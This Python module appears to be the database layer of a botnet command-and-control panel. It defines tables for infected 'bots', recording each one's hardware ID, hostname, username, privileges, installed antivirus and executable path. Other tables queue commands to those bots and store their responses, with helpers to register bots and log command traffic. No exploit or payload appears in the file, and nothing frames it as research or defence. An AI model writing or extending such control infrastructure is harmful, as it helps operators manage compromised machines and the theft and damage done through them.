import sqlite3
import aiosqlite
from pathlib import Path

DB_PATH = Path(__file__).parent.parent.parent / "panel.db"


async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS bots (
                hwid TEXT PRIMARY KEY,
                hostname TEXT,
                os TEXT,
                arch TEXT,
                username TEXT,
                privileges TEXT,
                av TEXT,
                exe_path TEXT,
                version TEXT,
                first_seen INTEGER,
                last_seen INTEGER
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS commands (
                id TEXT PRIMARY KEY,
                bot_hwid TEXT,
                command_type TEXT,
                args TEXT,
                sent_at INTEGER,
                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid)
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS responses (
                id TEXT PRIMARY KEY,
                command_id TEXT,
                status TEXT,
                data TEXT,
                received_at INTEGER,
                FOREIGN KEY (command_id) REFERENCES commands(id)
            )
        """)
        await db.commit()


async def upsert_bot(info: dict):
    import time
    now = int(time.time())
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO bots (hwid, hostname, os, arch, username, privileges, av, exe_path, version, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(hwid) DO UPDATE SET
                hostname=excluded.hostname, os=excluded.os, arch=excluded.arch,
                username=excluded.username, privileges=excluded.privileges,
                av=excluded.av, exe_path=excluded.exe_path, version=excluded.version,
                last_seen=excluded.last_seen
        """, (
            info["hwid"], info["hostname"], info["os"], info["arch"],
            info["username"], info["privileges"], str(info.get("av", [])),
            info.get("exe_path", ""), info.get("version", ""),
            now, now,
        ))
        await db.commit()


async def list_bots() -> list[dict]:
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = sqlite3.Row
        async with db.execute("SELECT * FROM bots ORDER BY last_seen DESC") as cursor:
            return [dict(row) async for row in cursor]


async def save_command(cmd_id: str, bot_hwid: str, command_type: str, args: str):
    import time
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO commands (id, bot_hwid, command_type, args, sent_at) VALUES (?, ?, ?, ?, ?)",
            (cmd_id, bot_hwid, command_type, args, int(time.time())),
        )
        await db.commit()


async def save_response(resp_id: str, command_id: str, status: str, data: str):
    import time
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO responses (id, command_id, status, data, received_at) VALUES (?, ?, ?, ?, ?)",
            (resp_id, command_id, status, data, int(time.time())),
        )
        await db.commit()
